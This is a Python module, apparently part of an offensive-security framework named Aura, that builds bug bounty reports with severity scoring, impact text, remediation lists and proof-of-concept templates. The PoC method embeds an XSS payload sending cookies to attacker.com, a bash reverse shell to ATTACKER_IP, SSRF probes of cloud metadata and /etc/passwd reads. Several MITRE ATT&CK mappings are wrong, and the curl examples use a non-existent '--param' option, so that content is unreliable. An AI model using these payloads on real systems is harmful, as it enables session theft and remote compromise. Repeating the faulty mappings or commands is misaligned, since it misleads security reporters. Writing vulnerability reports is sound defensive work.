"""
Professional Bug Bounty Report Generator for Aura
Generates submission-ready reports for HackerOne, Bugcrowd, Intigriti, and other platforms.

Features:
- Executive summary
- CVSS v3.1 scoring
- Detailed steps to reproduce
- Professional impact analysis
- Remediation recommendations
- POC code blocks
- Attachments/references
- Multiple export formats (Markdown, HTML)
"""
import os
import json
from datetime import datetime
from typing import List, Dict, Optional
from collections import defaultdict


class ProfessionalReporter:
    """
    Generates professional, submission-ready bug bounty reports.
    Supports multiple platforms: HackerOne, Bugcrowd, Intigriti, and generic.
    """

    # CVSS v3.1 Severity Thresholds
    CVSS_SEVERITY = {
        (9.0, 10.0): ("CRITICAL", "red"),
        (7.0, 8.9): ("HIGH", "orange"),
        (4.0, 6.9): ("MEDIUM", "yellow"),
        (0.1, 3.9): ("LOW", "green"),
        (0.0, 0.0): ("INFO", "grey")
    }

    # Platform-specific field mappings
    PLATFORM_TEMPLATES = {
        "hackerone": {
            "title_prefix": "[",
            "title_suffix": "]",
            "severity_format": "CVSS v3.1: {cvss} ({severity})"
        },
        "bugcrowd": {
            "title_prefix": "[",
            "title_suffix": "]",
            "severity_format": "CVSS: {cvss} - {severity}"
        },
        "intigriti": {
            "title_prefix": "[",
            "title_suffix": "]",
            "severity_format": "CVSS 3.1: {cvss} ({severity})"
        },
        "generic": {
            "title_prefix": "",
            "title_suffix": "",
            "severity_format": "{severity} - CVSS {cvss}"
        }
    }

    # Detailed impact descriptions
    IMPACT_DESCRIPTIONS = {
        "sql_injection": {
            "short": "SQL Injection allows attackers to execute arbitrary SQL queries on the database.",
            "extended": "An attacker can read, modify, or delete sensitive data including user credentials, personal information, and business data. In some configurations, SQL Injection can lead to complete server compromise throughxp_cmdshell or similar mechanisms."
        },
        "xss": {
            "short": "Cross-Site Scripting allows attackers to execute malicious scripts in victim's browser.",
            "extended": "An attacker can steal session cookies, deface websites, redirect users to phishing sites, or perform actions on behalf of the victim. Stored XSS affects all users visiting the compromised page."
        },
        "ssrf": {
            "short": "Server-Side Request Forgery allows attackers to abuse server to make internal requests.",
            "extended": "An attacker can access internal services like AWS metadata (169.254.169.254), internal databases, or internal admin panels. This can lead to cloud account compromise and remote code execution."
        },
        "idor": {
            "short": "IDOR allows attackers to access other users' resources by manipulating object IDs.",
            "extended": "An attacker can view, modify, or delete other users' data without authorization. This violates access control and can lead to privacy violations, data breaches, and financial fraud."
        },
        "rce": {
            "short": "Remote Code Execution allows attackers to execute arbitrary code on the server.",
            "extended": "An attacker gains complete control over the server, enabling data theft, malware installation, lateral movement to other systems, and complete infrastructure compromise."
        },
        "command_injection": {
            "short": "Command Injection allows attackers to execute OS commands on the server.",
            "extended": "An attacker can execute arbitrary system commands, potentially gaining root access, installing backdoors, stealing data, or using the server for cryptocurrency mining."
        },
        "open_redirect": {
            "short": "Open Redirect allows attackers to redirect victims to malicious websites.",
            "extended": "An attacker can phish users by redirecting them to fake login pages that steal credentials. This exploits user trust in the legitimate domain."
        },
        "xxe": {
            "short": "XML External Entity allows attackers to read internal files or perform SSRF.",
            "extended": "An attacker can read sensitive files (/etc/passwd, source code, credentials), probe internal network, or cause denial of service by referencing external entities."
        },
        "lfi": {
            "short": "Local File Inclusion allows attackers to read local files on the server.",
            "extended": "An attacker can read sensitive files including credentials, configuration files, and source code. In certain configurations, LFI can escalate to remote code execution."
        },
        "auth_bypass": {
            "short": "Authentication Bypass allows attackers to access accounts without proper credentials.",
            "extended": "An attacker can gain unauthorized access to user accounts, including admin accounts, without knowing the password. This can lead to full account takeover and data breach."
        },
        "csrf": {
            "short": "Cross-Site Request Forgery forces users to execute unwanted actions.",
            "extended": "An attacker can force users to perform actions like password changes, money transfers, or data modifications without their consent or knowledge."
        },
        "subdomain_takeover": {
            "short": "Subdomain Takeover occurs when a subdomain points to unclaimed cloud resources.",
            "extended": "An attacker can host malicious content on a trusted subdomain, enabling phishing attacks that appear to come from a legitimate domain."
        },
        "jwt_weakness": {
            "short": "JWT Weakness allows attackers to forge or manipulate authentication tokens.",
            "extended": "An attacker can impersonate any user by crafting malicious JWT tokens, potentially gaining admin privileges or accessing sensitive user data."
        },
        "ssti": {
            "short": "Server-Side Template Injection allows attackers to execute arbitrary code on the server.",
            "extended": "An attacker can achieve remote code execution by injecting malicious templates, gaining full control over the server and its data."
        }
    }

    # Remediation templates
    REMEDIATION_TEMPLATES = {
        "sql_injection": [
            "Use parameterized queries (prepared statements) for all database interactions",
            "Never concatenate user input directly into SQL queries",
            "Implement input validation and output encoding",
            "Apply least privilege to database accounts"
        ],
        "xss": [
            "Implement Context-Aware Output Encoding for all user input",
            "Use Content Security Policy (CSP) headers to restrict script execution",
            "Enable X-XSS-Protection header",
            "Use secure frameworks that auto-escape by default (React, Angular)"
        ],
        "ssrf": [
            "Block internal IP ranges from being accessed (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)",
            "Validate and sanitize all URL inputs against an allowlist",
            "Disable unnecessary URL schemas (file://, dict://, gopher://)",
            "Use network segmentation to isolate internal services"
        ],
        "idor": [
            "Implement proper authorization checks on all object access",
            "Use indirect references instead of direct object IDs",
            "Validate user ownership of resources before access",
            "Use framework-level access controls consistently"
        ],
        "rce": [
            "Never pass user input to eval(), exec(), or similar functions",
            "Use secure coding practices and input validation",
            "Apply principle of least privilege to processes",
            "Implement sandboxing for any necessary code execution"
        ],
        "open_redirect": [
            "Use relative URLs instead of absolute when possible",
            "Implement URL validation against an allowlist of permitted domains",
            "Never include user input directly in redirect URLs",
            "Display warning page for external redirects"
        ],
        "xxe": [
            "Disable XML external entity processing in XML parsers",
            "Use less complex data formats like JSON when possible",
            "Validate and sanitize XML input",
            "Apply secure XML parser configurations"
        ],
        "lfi": [
            "Avoid including files based on user input when possible",
            "Use whitelist approach for permitted files only",
            "Sanitize file paths and prevent path traversal sequences",
            "Run applications with minimal filesystem permissions"
        ],
        "auth_bypass": [
            "Implement strong authentication mechanisms",
            "Use secure password reset flows with proper token validation",
            "Add multi-factor authentication (MFA)",
            "Rate limit authentication endpoints"
        ],
        "csrf": [
            "Implement anti-CSRF tokens for all state-changing operations",
            "Use SameSite cookies (Strict or Lax)",
            "Check Origin/Referer headers for requests",
            "Implement proper authentication checks"
        ],
        "subdomain_takeover": [
            "Remove or claim dangling DNS records pointing to unused services",
            "Use CNAME validation tools to detect misconfigured DNS",
            "Implement automated monitoring for DNS changes",
            "Set proper TTL values and monitor for expired records"
        ],
        "jwt_weakness": [
            "Use strong, asymmetric signing algorithms (RS256)",
            "Validate all JWT claims (expiration, issuer, audience)",
            "Reject tokens with 'none' algorithm",
            "Implement proper token storage and transmission"
        ]
    }

    # MITRE ATT&CK mappings
    MITRE_MAPPINGS = {
        "sql_injection": "T1190 - Exploit Public-Facing Application",
        "xss": "T1189 - Drive-by Compromise",
        "ssrf": "T1051 - Shared Webroot",
        "idor": "T1220 - Exploitation for Credential Access",
        "rce": "T1059 - Command and Scripting Interpreter",
        "command_injection": "T1059 - Command and Scripting Interpreter",
        "open_redirect": "T1566 - Phishing",
        "xxe": "T1190 - Exploit Public-Facing Application",
        "lfi": "T1190 - Exploit Public-Facing Application",
        "auth_bypass": "T1078 - Valid Accounts",
        "csrf": "T1220 - Exploit for Client Execution",
        "subdomain_takeover": "T1584 - Compromise Infrastructure"
    }

    # OWASP mappings
    OWASP_MAPPINGS = {
        "sql_injection": "A03:2021 - Injection",
        "xss": "A03:2021 - Injection",
        "ssrf": "A10:2021 - Server-Side Request Forgery",
        "idor": "A01:2021 - Broken Access Control",
        "rce": "A03:2021 - Injection",
        "command_injection": "A03:2021 - Injection",
        "open_redirect": "A01:2021 - Broken Access Control",
        "xxe": "A03:2021 - Injection",
        "lfi": "A03:2021 - Injection",
        "auth_bypass": "A07:2021 - Identification and Authentication Failures",
        "csrf": "A01:2021 - Broken Access Control",
        "subdomain_takeover": "A04:2021 - Insecure Design"
    }

    def __init__(self, db_path=None):
        from aura.core.storage import AuraStorage
        self.db = AuraStorage(db_path)
        _pkg_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
        self.report_dir = os.path.join(_pkg_root, "reports")
        os.makedirs(self.report_dir, exist_ok=True)

    def _get_cvss_severity(self, cvss_score: float) -> str:
        """Get severity label from CVSS score."""
        for (low, high), (severity, _) in self.CVSS_SEVERITY.items():
            if low <= cvss_score <= high:
                return severity
        return "INFO"

    def _normalize_vuln_type(self, vuln_type: str) -> str:
        """Normalize vulnerability type for matching."""
        return vuln_type.lower().replace(" ", "_").replace("-", "_").replace("/", "_")

    def _get_impact_description(self, vuln_type: str) -> tuple:
        """Get short and extended impact description."""
        normalized = self._normalize_vuln_type(vuln_type)
        for key, desc in self.IMPACT_DESCRIPTIONS.items():
            if key in normalized:
                return desc["short"], desc["extended"]
        return (
            f"A {vuln_type} vulnerability could lead to security issues.",
            f"This {vuln_type} issue could be exploited to compromise the confidentiality, integrity, or availability of the system."
        )

    def _get_remediation(self, vuln_type: str) -> List[str]:
        """Get remediation steps for vulnerability type."""
        normalized = self._normalize_vuln_type(vuln_type)
        for key, steps in self.REMEDIATION_TEMPLATES.items():
            if key in normalized:
                return steps
        return [
            "Implement appropriate input validation and sanitization",
            "Apply secure coding best practices",
            "Implement proper access controls",
            "Follow the principle of least privilege"
        ]

    def _get_mitre(self, vuln_type: str) -> str:
        """Get MITRE ATT&CK mapping."""
        normalized = self._normalize_vuln_type(vuln_type)
        for key, mitre in self.MITRE_MAPPINGS.items():
            if key in normalized:
                return mitre
        return "T1190 - Exploit Public-Facing Application"

    def _get_owasp(self, vuln_type: str) -> str:
        """Get OWASP Top 10 mapping."""
        normalized = self._normalize_vuln_type(vuln_type)
        for key, owasp in self.OWASP_MAPPINGS.items():
            if key in normalized:
                return owasp
        return "A00:2021 - Unknown"

    def _generate_poc(self, vuln_type: str, url: str, payload: str = None) -> str:
        """Generate proof of concept code."""
        normalized = self._normalize_vuln_type(vuln_type)
        poc = ""

        if "sql" in normalized:
            poc = f"""```bash
# SQL Injection POC
curl -X GET "{url}" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  --param "id=1' OR '1'='1"

# Time-based Blind SQL Injection
curl -X GET "{url}" \\
  --param "id=1' AND SLEEP(5)--"
```"""
        elif "xss" in normalized:
            poc = f"""```html
<!-- XSS POC -->
<script>alert(document.cookie)</script>

<!-- Stored XSS in comment field -->
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">

<!-- DOM XSS -->
{url}?search=<script>alert(document.domain)</script>
```"""
        elif "ssrf" in normalized:
            poc = f"""```bash
# SSRF POC - AWS Metadata
curl -X GET "{url}" \\
  --param "url=http://169.254.169.254/latest/meta-data/"

# Internal Port Scanning
curl -X GET "{url}" \\
  --param "url=http://localhost:22"
```"""
        elif "idor" in normalized:
            poc = f"""```bash
# IDOR POC - Change user_id to access other users
curl -X GET "{url}" \\
  -H "Cookie: session=attacker_session" \\
  --param "user_id=12345"
```"""
        elif "rce" in normalized or "command" in normalized:
            poc = f"""```bash
# RCE/Command Injection POC
curl -X GET "{url}" \\
  --param "cmd=whoami"

# Reverse Shell
curl -X GET "{url}" \\
  --param "cmd=bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```"""
        elif "lfi" in normalized:
            poc = f"""```bash
# LFI POC
curl -X GET "{url}" \\
  --param "file=/etc/passwd"

# Log Poisoning
curl -X GET "{url}" \\
  --param "file=/var/log/apache2/access.log"
```"""
        else:
            poc = f"""```bash
# Generic POC for {vuln_type}
curl -X GET "{url}" \\
  --param "payload={payload or 'test'}"

# With custom header
curl -X GET "{url}" \\
  -H "X-Forwarded-For: 127.0.0.1" \\
  --param "payload={payload or 'test'}"
```"""
        return poc

    def _generate_executive_summary(self, findings: List[Dict]) -> str:
        """Generate executive summary section."""
        total = len(findings)
        critical = sum(1 for f in findings if f.get("severity") == "CRITICAL")
        high = sum(1 for f in findings if f.get("severity") == "HIGH")
        medium = sum(1 for f in findings if f.get("severity") == "MEDIUM")
        low = sum(1 for f in findings if f.get("severity") == "LOW")
        info = sum(1 for f in findings if f.get("severity") == "INFO")

        avg_cvss = sum(f.get("cvss_score", 0) for f in findings) / total if total else 0

        summary = f"""## Executive Summary

This report presents the findings from a comprehensive security assessment conducted on the target assets.
The assessment revealed **{total}** security findings, including **{critical}** Critical, **{high}** High, **{medium}** Medium, **{low}** Low, and **{info}** Informational issues.

### Key Statistics

| Metric | Value |
|--------|-------|
| Total Findings | {total} |
| Critical Severity | {critical} |
| High Severity | {high} |
| Medium Severity | {medium} |
| Low Severity | {low} |
| Informational | {info} |
| Average CVSS | {avg_cvss:.1f} |

### Assessment Scope

The assessment included testing of:
- Authentication and authorization mechanisms
- Input validation and sanitization
- Business logic workflows
- API endpoints and integrations
- Sensitive data handling

### Recommendations

Based on the findings, we recommend prioritizing remediation of Critical and High severity vulnerabilities,
followed by Medium and Low severity issues. All findings should be addressed in accordance with the
severity classifications and business impact outlined in this report.

"""
        return summary

    def generate_markdown_report(
        self,
        output_path: str = None,
        target_filter: str = None,
        platform: str = "generic"
    ) -> str:
        """Generate a professional Markdown bug bounty report."""
        # Fetch findings from database
        from aura.core.reporter import AuraReporter
        pdf_reporter = AuraReporter(self.db.db_path)
        targets, _, _, _ = pdf_reporter._fetch_data(target_filter)

        if not targets:
            return None

        # Gather unique findings
        seen_f = set()
        all_findings = []
        for t in targets:
            domain = t.get("value", "Target")
            for f in t.get('findings', []):
                key = f.get('finding_type', f.get('type', 'Unknown'))
                if key not in seen_f:
                    seen_f.add(key)
                    f['_target_domain'] = domain
                    all_findings.append(f)

        if not all_findings:
            return None

        # Sort by severity
        sev_rank = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}
        all_findings.sort(key=lambda x: sev_rank.get(x.get('severity', 'INFO'), 0), reverse=True)

        # Generate report
        if not output_path:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_path = os.path.join(self.report_dir, f"bug_bounty_report_{timestamp}.md")

        template = self.PLATFORM_TEMPLATES.get(platform, self.PLATFORM_TEMPLATES["generic"])

        with open(output_path, "w", encoding="utf-8") as f:
            # Header
            f.write(f"# Bug Bounty Security Report\n\n")
            f.write(f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC\n")
            f.write(f"**Platform:** {platform.title()}\n\n")
            f.write("---\n\n")

            # Executive Summary
            f.write(self._generate_executive_summary(all_findings))
            f.write("---\n\n")

            # Findings Detail
            f.write("## Detailed Findings\n\n")

            for i, finding in enumerate(all_findings, 1):
                sev = finding.get('severity', 'INFO')
                cvss = float(finding.get('cvss_score', finding.get('cvss', 0.0)))
                vuln_type = finding.get('finding_type', finding.get('type', 'Unknown'))
                domain = finding.get('_target_domain', 'Target')
                url = finding.get('evidence_url', finding.get('location', ''))
                payload = finding.get('payload', '')
                description = finding.get('description', '')
                impact_short, impact_extended = self._get_impact_description(vuln_type)
                remediation = self._get_remediation(vuln_type)
                mitre = self._get_mitre(vuln_type)
                owasp = self._get_owasp(vuln_type)

                # Finding header
                f.write(f"### {i}. {vuln_type}\n\n")
                f.write(f"**Severity:** {sev} | **CVSS:** {cvss} | **Domain:** {domain}\n\n")

                # Summary
                f.write("#### Summary\n\n")
                f.write(f"{description or impact_short}\n\n")

                # Technical Details
                f.write("#### Technical Details\n\n")
                f.write(f"- **Vulnerability Type:** {vuln_type}\n")
                f.write(f"- **Affected URL:** `{url}`\n")
                if payload:
                    f.write(f"- **Sample Payload:** `{payload[:100]}`\n")
                f.write(f"- **MITRE ATT&CK:** {mitre}\n")
                f.write(f"- **OWASP Top 10:** {owasp}\n\n")

                # Steps to Reproduce
                f.write("#### Steps to Reproduce\n\n")
                poc = self._generate_poc(vuln_type, url, payload)
                f.write(f"""1. Navigate to the affected endpoint: `{url}`
2. Identify the vulnerable parameter
3. Submit the following request to confirm the vulnerability:

{poc}

4. Observe the application's response
5. Document the impact with screenshots and network traces\n\n""")

                # Impact Analysis
                f.write("#### Impact Analysis\n\n")
                f.write(f"{impact_extended}\n\n")

                # Remediation
                f.write("#### Remediation Recommendations\n\n")
                for j, step in enumerate(remediation, 1):
                    f.write(f"{j}. {step}\n")
                f.write("\n")

                # References
                f.write("#### References\n\n")
                f.write(f"- [OWASP: {vuln_type}](https://owasp.org/www-community/vulnerabilities/{vuln_type.replace(' ', '_')})\n")
                f.write(f"- [PortSwigger Academy](https://portswigger.net/web-security/)\n")
                f.write(f"- [MITRE ATT&CK](https://attack.mitre.org/)\n\n")

                f.write("---\n\n")

            # Footer
            f.write("---\n\n")
            f.write("*Report generated by Aura Framework - Offensive Security Automation*\n")

        return output_path

    def generate_html_report(
        self,
        output_path: str = None,
        target_filter: str = None,
        platform: str = "generic"
    ) -> str:
        """Generate a professional HTML bug bounty report."""
        # First generate markdown
        md_path = output_path or os.path.join(
            self.report_dir,
            f"bug_bounty_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        )
        md_path = self.generate_markdown_report(md_path, target_filter, platform)

        if not md_path:
            return None

        # Read markdown and convert to HTML (basic conversion)
        html_path = md_path.replace('.md', '.html')

        with open(md_path, 'r', encoding='utf-8') as md_file:
            md_content = md_file.read()

        # Basic HTML template
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bug Bounty Security Report</title>
    <style>
        :root {{
            --primary: #7d00ff;
            --critical: #ff0044;
            --high: #ff6600;
            --medium: #ffaa00;
            --low: #00aa44;
            --info: #888888;
            --bg: #0a0a0c;
            --card: #16161d;
            --text: #e0e0e0;
            --border: #333;
        }}
        body {{
            font-family: 'Segoe UI', -apple-system, sans-serif;
            background: var(--bg);
            color: var(--text);
            line-height: 1.7;
            padding: 40px;
            max-width: 900px;
            margin: 0 auto;
        }}
        h1, h2, h3 {{ color: var(--primary); margin-top: 1.5em; }}
        h1 {{ border-bottom: 2px solid var(--primary); padding-bottom: 10px; }}
        h2 {{ border-bottom: 1px solid var(--border); padding-bottom: 8px; }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            text-align: left;
            padding: 12px;
            border-bottom: 1px solid var(--border);
        }}
        th {{ color: var(--primary); text-transform: uppercase; font-size: 0.85em; }}
        .severity-CRITICAL {{ color: var(--critical); font-weight: bold; }}
        .severity-HIGH {{ color: var(--high); font-weight: bold; }}
        .severity-MEDIUM {{ color: var(--medium); font-weight: bold; }}
        .severity-LOW {{ color: var(--low); font-weight: bold; }}
        .severity-INFO {{ color: var(--info); }}
        pre {{
            background: var(--card);
            padding: 15px;
            border-radius: 8px;
            overflow-x: auto;
            border-left: 3px solid var(--primary);
        }}
        code {{
            background: var(--card);
            padding: 2px 6px;
            border-radius: 4px;
            font-family: 'Fira Code', monospace;
        }}
        pre code {{
            background: none;
            padding: 0;
        }}
        .finding {{
            background: var(--card);
            padding: 25px;
            border-radius: 12px;
            margin: 20px 0;
            border: 1px solid var(--border);
        }}
        .metadata {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 15px 0;
        }}
        .meta-item {{
            background: rgba(125, 0, 255, 0.1);
            padding: 10px 15px;
            border-radius: 6px;
        }}
        .meta-label {{
            font-size: 0.8em;
            color: #888;
            text-transform: uppercase;
        }}
        .meta-value {{
            font-weight: 600;
            color: var(--primary);
        }}
        .poc {{ margin: 20px 0; }}
        .references {{
            font-size: 0.9em;
            color: #888;
        }}
        .references a {{ color: var(--primary); }}
        hr {{
            border: none;
            border-top: 1px solid var(--border);
            margin: 30px 0;
        }}
        .badge {{
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: bold;
        }}
        .badge-CRITICAL {{ background: var(--critical); }}
        .badge-HIGH {{ background: var(--high); color: #000; }}
        .badge-MEDIUM {{ background: var(--medium); color: #000; }}
        .badge-LOW {{ background: var(--low); }}
        .badge-INFO {{ background: var(--info); }}
    </style>
</head>
<body>
"""

        # Convert markdown to basic HTML
        import re
        md_lines = md_content.split('\n')
        in_code = False
        code_content = []

        for line in md_lines:
            # Headers
            if line.startswith('### '):
                level = len(line) - len(line.lstrip('#'))
                text = line.lstrip('#').strip()
                html_content += f'<h{level + 1}>{text}</h{level + 1}>\n'
            elif line.startswith('## '):
                text = line.lstrip('#').strip()
                html_content += f'<h2>{text}</h2>\n'
            elif line.startswith('# '):
                text = line.lstrip('#').strip()
                html_content += f'<h1>{text}</h1>\n'
            # Bold
            elif '**' in line:
                line = re.sub(r'\*\*(.+?)\*\*', r'<strong>\1</strong>', line)
                html_content += f'<p>{line}</p>\n'
            # Code blocks
            elif line.startswith('```'):
                if not in_code:
                    lang = line.strip()[3:]
                    html_content += f'<pre><code class="language-{lang}">\n'
                    in_code = True
                else:
                    html_content += '</code></pre>\n'
                    in_code = False
            elif in_code:
                html_content += f'{line}\n'
            # Lists
            elif line.startswith('- '):
                html_content += f'<li>{line[2:]}</li>\n'
            elif re.match(r'^\d+\.', line):
                html_content += f'<li>{re.sub(r"^\d+\.\s*", "", line)}</li>\n'
            # Paragraphs
            elif line.strip():
                html_content += f'<p>{line}</p>\n'
            # Empty lines
            elif not line.strip():
                html_content += '\n'
            else:
                html_content += f'{line}\n'

        html_content += """
</body>
</html>"""

        with open(html_path, 'w', encoding='utf-8') as html_file:
            html_file.write(html_content)

        return html_path

    def generate_summary_table(self, findings: List[Dict]) -> str:
        """Generate a summary table of findings."""
        table = "| # | Severity | CVSS | Type | Domain | Status |\n"
        table += "|----|----------|------|------|--------|--------|\n"

        sev_rank = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}
        findings.sort(key=lambda x: sev_rank.get(x.get('severity', 'INFO'), 0), reverse=True)

        for i, f in enumerate(findings, 1):
            sev = f.get('severity', 'INFO')
            cvss = f.get('cvss_score', f.get('cvss', 0.0))
            vuln_type = f.get('finding_type', f.get('type', 'Unknown'))
            domain = f.get('_target_domain', 'N/A')
            status = f.get('status', 'OPEN')

            table += f"| {i} | {sev} | {cvss:.1f} | {vuln_type} | {domain} | {status} |\n"

        return table
